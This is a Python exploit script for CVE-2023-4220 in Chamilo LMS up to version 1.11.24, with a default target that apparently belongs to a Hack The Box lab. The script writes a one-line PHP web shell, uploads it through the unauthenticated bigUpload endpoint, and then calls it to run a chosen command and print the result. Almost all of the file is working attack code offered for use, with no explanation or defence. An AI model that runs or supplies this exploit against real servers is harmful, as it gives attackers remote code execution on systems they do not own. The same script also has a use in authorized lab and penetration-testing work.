#!/usr/bin/python3

'''
author: dugisan3rd
github: https://github.com/dugisan3rd
'''

import requests
import argparse
from pwn import *
from termcolor import colored

def create_php():
    with open('oneliner.php', 'w') as f:
        f.write('<?php system($_GET["cmd"]);?>')
        f.close()

def upload(url):
    try:
        r = requests.post(url + '/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported', verify=False, files={'bigUploadFile': open('oneliner.php', 'r')}, proxies={'http': 'http://127.0.0.1:8080'})
        if r.status_code != 200:
            log.error('Upload failed!')
    except requests.exceptions.RequestException as e:
        raise SystemExit(e)

def rce(url, command):
    try:
        r = requests.get(url + f'/main/inc/lib/javascript/bigupload/files/oneliner.php?cmd={command}')
        if r.status_code == 200:
            log.success(f'File uploaded at {colored(url + "/main/inc/lib/javascript/bigupload/files/oneliner.php?cmd=<command>", "green")}')
            log.success(r.text)
        else:
            log.error('Unable to access uploaded file!')
    except requests.exceptions.RequestException as e:
        raise SystemExit(e)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="CVE-2023-4220: Chamilo LMS â‰¤ 1.11.24 - Remote Code Execution (https://starlabs.sg/advisories/23/23-4220/)")
    parser.add_argument('-u', '--url', help='Base URL', default='http://lms.permx.htb')
    parser.add_argument('-c', '--command', help='Command to execute', default='whoami')
    args = parser.parse_args()
    create_php()
    upload(args.url)
    rce(args.url, args.command)